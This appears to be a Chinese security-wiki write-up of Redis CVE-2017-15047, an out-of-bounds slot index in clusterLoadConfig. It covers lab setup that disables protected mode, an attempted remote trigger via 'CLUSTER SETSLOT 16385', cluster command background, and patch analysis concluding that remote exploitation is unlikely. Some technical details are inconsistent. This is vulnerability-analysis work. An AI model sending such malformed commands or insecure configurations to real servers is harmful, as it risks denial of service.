    <title>CVE-2017-15047_Redis数组索引越界漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:54:19.000Z</published>
    <updated>2021-07-06T08:57:38.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis cluster.c clusterLoadConfig数组索引越界漏洞</li><li>漏洞编号：CVE-2017-15047</li><li>漏洞类型：缓冲区错误</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：9.8】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 4.0.2版本中的cluster.c文件的‘clusterLoadConfig’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界数组索引和应用程序崩溃）。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        redis-server以集群形式部署，攻击者可以访问到redis-server。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​    Redis up to 4.0.2</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad">https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="环境安装-搭建"><a href="#环境安装-搭建" class="headerlink" title="环境安装/搭建"></a>环境安装/搭建</h3><p>​        在环境共享服务器中获取到环境源码\安装包，地址为:\\10.251.0.11\R-Redis\redis-3.2.7.tar.zip文件，解压编译即可。</p><p>​        启动前先更改配置文件redis.conf，开启集群模式。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/5.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">################################ REDIS CLUSTER ###############################</span><br><span class="line">#集群开关，默认是不开启集群模式。</span><br><span class="line">cluster-enabled yes</span><br><span class="line"></span><br><span class="line">#集群配置文件的名称，每个节点都有一个集群相关的配置文件，持久化保存集群的信息。这个文件并不需要手动配置，这个配置文件有Redis生成并更新，每个Redis集群节点需要一个单独的配置文件，请确保与实例运行的系统中配置文件名称不冲突</span><br><span class="line">cluster-config-file nodes-7021.conf</span><br><span class="line"></span><br><span class="line">#节点互连超时的阀值。集群节点超时毫秒数</span><br><span class="line">cluster-node-timeout 30000</span><br><span class="line"></span><br><span class="line">#在进行故障转移的时候，全部slave都会请求申请为master，但是有些slave可能与master断开连接一段时间了，导致数据过于陈旧，这样的slave不应该被提升&gt;为master。该参数就是用来判断slave节点与master断线的时间是否过长。判断方法是：</span><br><span class="line">#比较slave断开连接的时间和(node-timeout * slave-validity-factor) + repl-ping-slave-period</span><br><span class="line">#如果节点超时时间为三十秒, 并且slave-validity-factor为10,假设默认的repl-ping-slave-period是10秒，即如果超过310秒slave将不会尝试进行故障转移</span><br><span class="line">#可能出现由于某主节点失联却没有从节点能顶上的情况，从而导致集群不能正常工作，在这种情况下，只有等到原来的主节点重新回归到集群，集群才恢复运作</span><br><span class="line">#如果设置成０，则无论从节点与主节点失联多久，从节点都会尝试升级成主节</span><br><span class="line">cluster-slave-validity-factor 10</span><br><span class="line"></span><br><span class="line">#master的slave数量大于该值，slave才能迁移到其他孤立master上，如这个参数若被设为2，那么只有当一个主节点拥有2 个可工作的从节点时，它的一个从节&gt;点会尝试迁移。</span><br><span class="line">#主节点需要的最小从节点数，只有达到这个数，主节点失败时，它从节点才会进行迁移。</span><br><span class="line"># cluster-migration-barrier 1</span><br><span class="line"></span><br><span class="line">#默认情况下，集群全部的slot有节点分配，集群状态才为ok，才能提供服务。设置为no，可以在slot没有全部分配的时候提供服务。不建议打开该配置，这样会</span><br><span class="line">造成分区的时候，小分区的master一直在接受写请求，而造成很长时间数据不一致。</span><br><span class="line">#在部分key所在的节点不可用时，如果此参数设置为”yes”(默认值), 则整个集群停止接受操作；如果此参数设置为”no”，则集群依然为可达节点上的key提供读&gt;操作</span><br><span class="line">cluster-require-full-coverage yes</span><br></pre></td></tr></table></figure><p>​        注释bind 127.0.0.1，开启远程访问。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/16.png"></p><p>​        关闭保护模式.</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/17.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        在攻击机上发送cluster setslot命令，创建一个大于16384的槽号，为了达到拒绝服务目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.251.0.36 CLUSTER SETSLOT 16385 NODE node</span><br></pre></td></tr></table></figure><p>​        复现redis-server报错</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/9.png"></p><p>​        配置redis.conf，按照redis.conf配置启动靶机的redis-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        靶机上测试一下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLUSTER SETSLOT 16385 NODE node</span><br></pre></td></tr></table></figure><p>​        发现已经修复了此漏洞，redis-server对槽号大小做了边界检查。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        远程测试也是报此错误。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/9.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p><strong>一、Redis Cluster简单概述</strong></p><p><strong>1. Redis Cluster特点</strong></p><ul><li><strong>多主多从，去中心化</strong>：从节点作为备用，复制主节点，不做读写操作，不提供服务</li><li><strong>不支持处理多个key</strong>：因为数据分散在多个节点，在数据量大高并发的情况下会影响性能；</li><li><strong>支持动态扩容节点</strong>：这是Rerdis Cluster最大的优点之一；</li><li><strong>节点之间相互通信，相互选举，不再依赖sentinel</strong>：准确来说是主节点之间相互“监督”，保证及时故障转移</li></ul><p><strong>2.Redis Cluster与其它集群模式的区别</strong></p><ul><li>相比较sentinel模式，<strong>多个master节点保证主要业务（比如master节点主要负责写）稳定性，不需要搭建多个sentinel实例监控一个master节点</strong>；</li><li>相比较一主多从的模式，不需要手动切换<strong>，具有自我故障检测，故障转移的特点</strong>；</li><li>相比较其他两个模式而言，<strong>对数据进行分片（sharding），不同节点存储的数据是不一样的</strong>；</li><li>从某种程度上来说，Sentinel模式主要针对高可用（HA），<strong>而Cluster模式是不仅针对大数据量，高并发，同时也支持HA。</strong></li></ul><p><strong>二、Redis Cluster如何集群实现？</strong></p><p><strong>1.Redis Cluster是如何将数据分片的？—-哈希槽Slot</strong><br>　　<strong>（1）哈希槽介绍</strong></p><p>​        Redis集群使用一种称作一致性哈希的复合分区形式（组合了哈希分区和列表分袂的特征来计算键的归属实例），键的CRC16哈希值被称为哈希槽。比如对于三个Redis节点，哈希槽的分配方式如下：</p><p>　　第一个节点拥有0-5500哈希槽</p><pre><code> 第二节点拥有5501-11000哈希槽 第三节点拥有剩余的11001-16384哈希槽</code></pre><p>　　 一个键的对应的哈希槽通过计算键的CRC16 哈希值，然后对16384进行取模得到：HASH_SLOT=CRC16(key) modulo 16383，Redis提供了CLUSTER KEYSLOT命令来执行哈希槽的计算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLUSTER KEYSLOT name</span><br></pre></td></tr></table></figure><p><strong>集群在线重配置（live reconfiguration）</strong></p><p>​        Redis 集群支持在集群运行的过程中添加或者移除节点。</p><p>​        实际上， 节点的添加操作和节点的删除操作可以抽象成同一个操作， 那就是， 将哈希槽从一个节点移动到另一个节点：</p><ul><li>添加一个新节点到集群， 等于将其他已存在节点的槽移动到一个空白的新节点里面。</li><li>从集群中移除一个节点， 等于将被移除节点的所有槽移动到集群的其他节点上面去。</li></ul><p>​        因此， 实现 Redis 集群在线重配置的核心就是将槽从一个节点移动到另一个节点的能力。 因为一个哈希槽实际上就是一些键的集合， 所以 Redis 集群在重哈希（rehash）时真正要做的， 就是将一些键从一个节点移动到另一个节点。</p><p>​        要理解 Redis 集群如何将槽从一个节点移动到另一个节点， 我们需要对 <code>CLUSTER</code> 命令的各个子命令进行介绍， 这些命理负责管理集群节点的槽转换表（slots translation table）。</p><p>以下是 <code>CLUSTER</code> 命令可用的子命令：</p><ul><li><code>CLUSTER ADDSLOTS slot1 [slot2] ... [slotN]</code></li><li><code>CLUSTER DELSLOTS slot1 [slot2] ... [slotN]</code></li><li><code>CLUSTER SETSLOT slot NODE node</code></li><li><code>CLUSTER SETSLOT slot MIGRATING node</code></li><li><code>CLUSTER SETSLOT slot IMPORTING node</code></li></ul><p>​        最开头的两条命令 <code>ADDSLOTS</code> 和 <code>DELSLOTS</code> 分别用于向节点指派（assign）或者移除节点， 当槽被指派或者移除之后， 节点会将这一信息通过 Gossip 协议传播到整个集群。 <code>ADDSLOTS</code> 命令通常在新创建集群时， 作为一种快速地将各个槽指派给各个节点的手段来使用。</p><p><code>CLUSTER SETSLOT slot NODE node</code> 子命令可以将指定的槽 <code>slot</code> 指派给节点 <code>node</code> 。</p><p>​        至于 <code>CLUSTER SETSLOT slot MIGRATING node</code> 命令和 <code>CLUSTER SETSLOT slot IMPORTING node</code> 命令， 前者用于将给定节点 <code>node</code> 中的槽 <code>slot</code> 迁移出节点， 而后者用于将给定槽 <code>slot</code> 导入到节点 <code>node</code> ：</p><ul><li><p>当一个槽被设置为 <code>MIGRATING</code> 状态时， 原来持有这个槽的节点仍然会继续接受关于这个槽的命令请求， 但只有命令所处理的键仍然存在于节点时， 节点才会处理这个命令请求。</p><p>如果命令所使用的键不存在与该节点， 那么节点将向客户端返回一个 <code>-ASK</code> 转向（redirection）错误， 告知客户端， 要将命令请求发送到槽的迁移目标节点。</p></li><li><p>当一个槽被设置为 <code>IMPORTING</code> 状态时， 节点仅在接收到 <code>ASKING</code> 命令之后， 才会接受关于这个槽的命令请求。</p><p>如果客户端没有向节点发送 <code>ASKING</code> 命令， 那么节点会使用 <code>-MOVED</code> 转向错误将命令请求转向至真正负责处理这个槽的节点。</p><p>上面关于 <code>MIGRATING</code> 和 <code>IMPORTING</code> 的说明有些难懂， 让我们用一个实际的实例来说明一下。</p><p>假设现在， 我们有 A 和 B 两个节点， 并且我们想将槽 <code>8</code> 从节点 A 移动到节点 B ， 于是我们：</p></li><li><p>向节点 B 发送命令 <code>CLUSTER SETSLOT 8 IMPORTING A</code></p></li><li><p>向节点 A 发送命令 <code>CLUSTER SETSLOT 8 MIGRATING B</code></p></li></ul><p>每当客户端向其他节点发送关于哈希槽 <code>8</code> 的命令请求时， 这些节点都会向客户端返回指向节点 A 的转向信息：</p><ul><li><p>如果命令要处理的键已经存在于槽 <code>8</code> 里面， 那么这个命令将由节点 A 处理。</p></li><li><p>如果命令要处理的键未存在于槽 <code>8</code> 里面（比如说，要向槽添加一个新的键）， 那么这个命令由节点 B 处理。</p><p>​    这种机制将使得节点 A 不再创建关于槽 <code>8</code> 的任何新键。</p></li></ul><p>​        与此同时， 一个特殊的客户端 <code>redis-trib</code> 以及 Redis 集群配置程序（configuration utility）会将节点 A 中槽 <code>8</code> 里面的键移动到节点 B 。</p><p>键的移动操作由以下两个命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLUSTER GETKEYSINSLOT slot count</span><br></pre></td></tr></table></figure><p>​        上面的命令会让节点返回 <code>count</code> 个 <code>slot</code> 槽中的键， 对于命令所返回的每个键， <code>redis-trib</code> 都会向节点 A 发送一条 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令， 该命令会将所指定的键原子地（atomic）从节点 A 移动到节点 B （在移动键期间，两个节点都会处于阻塞状态，以免出现竞争条件）。</p><p>​        以下为 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令的运作原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIGRATE target_host target_port key target_database id timeout</span><br></pre></td></tr></table></figure><p>​        执行 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令的节点会连接到 <code>target</code> 节点， 并将序列化后的 <code>key</code> 数据发送给 <code>target</code> ， 一旦 <code>target</code> 返回 <code>OK</code> ， 节点就将自己的 <code>key</code> 从数据库中删除。</p><p>​        从一个外部客户端的视角来看， 在某个时间点上， 键 <code>key</code> 要么存在于节点 A ， 要么存在于节点 B ， 但不会同时存在于节点 A 和节点 B 。</p><p>​        因为 Redis 集群只使用 <code>0</code> 号数据库， 所以当 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令被用于执行集群操作时， <code>target_database</code> 的值总是 <code>0</code> 。</p><p><code>target_database</code> 参数的存在是为了让 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令成为一个通用命令， 从而可以作用于集群以外的其他功能。</p><p>​        我们对 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 命令做了优化， 使得它即使在传输包含多个元素的列表键这样的复杂数据时， 也可以保持高效。</p><p>​        不过， 尽管 [MIGRATE host port key destination-db timeout <a href="http://redisdoc.com/internal/migrate.html#migrate">COPY] [REPLACE]</a> 非常高效， 对一个键非常多、并且键的数据量非常大的集群来说， 集群重配置还是会占用大量的时间， 可能会导致集群没办法适应那些对于响应时间有严格要求的应用程序。</p><p><strong>附所有redis-cluster相关的集群命令：</strong></p><ul><li>cluster info ：打印集群的信息</li><li>cluster nodes ：列出集群当前已知的所有节点（ node），以及这些节点的相关信息。</li><li>cluster meet <ip> <port> ：将 ip 和 port 所指定的节点添加到集群当中。</port></ip></li><li>cluster forget <node_id> ：从集群中移除 node_id 指定的节点。</node_id></li><li>cluster replicate <master_node_id> ：将当前从节点设置为 node_id 指定的master节点的slave节点。只能针对slave节点操作。</master_node_id></li><li>cluster saveconfig ：将节点的配置文件保存到硬盘里面。</li><li>cluster addslots <slot> [slot …] ：将一个或多个槽（ slot）指派（ assign）给当前节点。</slot></li><li>cluster delslots <slot> [slot …] ：移除一个或多个槽对当前节点的指派。</slot></li><li>cluster flushslots ：移除指派给当前节点的所有槽，让当前节点变成一个没有指派任何槽的节点。</li><li>cluster setslot <slot> node <node_id> ：将槽 slot 指派给 node_id 指定的节点，如果槽已经指派给</node_id></slot></li><li>cluster setslot <slot> migrating <node_id> ：将本节点的槽 slot 迁移到 node_id 指定的节点中。</node_id></slot></li><li>cluster setslot <slot> importing <node_id> ：从 node_id 指定的节点中导入槽 slot 到本节点。</node_id></slot></li><li>cluster setslot <slot> stable ：取消对槽 slot 的导入（ import）或者迁移（ migrate）。</slot></li><li>cluster keyslot <key> ：计算键 key 应该被放置在哪个槽上。</key></li><li>cluster countkeysinslot <slot> ：返回槽 slot 目前包含的键值对数量。</slot></li><li>cluster getkeysinslot <slot> <count> ：返回 count 个 slot 槽中的键 。</count></slot></li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        漏洞产生原因是在集群模式部署下，使用cluster相关命令时，对slot值没有做边界校验，导致直接索引migrating_slots_to和migrating_slots_from数组并赋值，而migrating_slots_to和migrating_slots_from数组大小由CLUSTER_SLOTS(16384)确定。一旦slot值大于16384，则会导致数组边界溢出。</p><p>src/cluster.h：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        在/redis/src/cluster.c的clusterLoadConfig函数，允许一个缓冲区溢出漏洞从用户可控输入数组索引之中。易受攻击的代码是：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        slot变量接收atoi的输出，该输出在此处运行：<code>slot = atoi(argv[j]+1);</code></p><p>​        现在，argv [j]基本上是使用sdssplitargs放入数组进行进一步处理的每行（存储在line []中）的参数。具有有限访问权限的攻击者将可以通过，超大的slot值而强制发生数组错误异常而触发内存损坏问题，甚至可能执行代码。</p><p>​        但是，此漏洞能不能远程触发还有待分析。</p><p>​        全局搜索clusterLoadConfig函数，只有在clusterInit函数中被调用一次，也就是在redis-server启动集群模式之初就开始执行，攻击者很难远程执行。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/13.png"></p><p>​        clusterLoadConfig函数加载cluster配置信息失败时的报错信息，这一点在靶机redis-server启动时可以验证：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/7.png"></p><p>​        故猜测无法远程利用此函数达到远程拒绝服务攻击。</p><p>​    clusterLoadConfig函数，在cluster创建时加载集群的配置文件，在redis.conf中可以找到相关信息：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/14.png"></p><p>​        <strong>node-6379.conf</strong>虽然此配置的名字叫”集群配置文件”，但是此配置文件不能人工编辑，它是集群节点自动维护的文件，主要用于记录集群中有哪些节点、他们的状态以及一些持久化参数等，方便在重启时恢复这些状态。通常是在收到请求之后这个文件就会被更新。</p><p>​        复现时已经触发一次，<strong>node-6379.conf</strong>里面记录上一次连接时的一些信息。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/15.png"></p><p>​        再次尝试利用远程命令设置slot值，看能不能远程触发边界索引溢出漏洞，当使用远程cluster命令时，redis-server调用clusterCommand函数。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/18.png"></p><p>​        执行cluster setslot命令时，执行下面内容：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/19.png"></p><p>​    会被getSlotOrReply函数检查提交的slot值与CLUSTER_SLOTS进行比较，若大于16384，则报错。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/10.png"></p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        漏洞产生原因是在集群模式部署下，使用cluster相关命令时，对slot值没有做边界校验，导致直接索引migrating_slots_to和migrating_slots_from数组并赋值，而migrating_slots_to和migrating_slots_from数组大小由CLUSTER_SLOTS(16384)确定。一旦slot值大于16384，则会导致数组边界溢出。</p><p>​        补丁是在/redis/src/cluster.c的clusterLoadConfig函数给migrating_slots_to和migrating_slots_from进行索引后赋值的地方进行了slot值与CLUSTER_SLOTS大小的判断，避免数组越界。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/11.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        尝试使用cluster setslot命令，触发漏洞，redis-server返回ERR信息。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/9.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/redis/redis/issues/4278">https://github.com/redis/redis/issues/4278</a></li><li><a href="https://security.gentoo.org/glsa/202008-17">https://security.gentoo.org/glsa/202008-17</a></li><li><a href="https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad">https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad</a></li><li><a 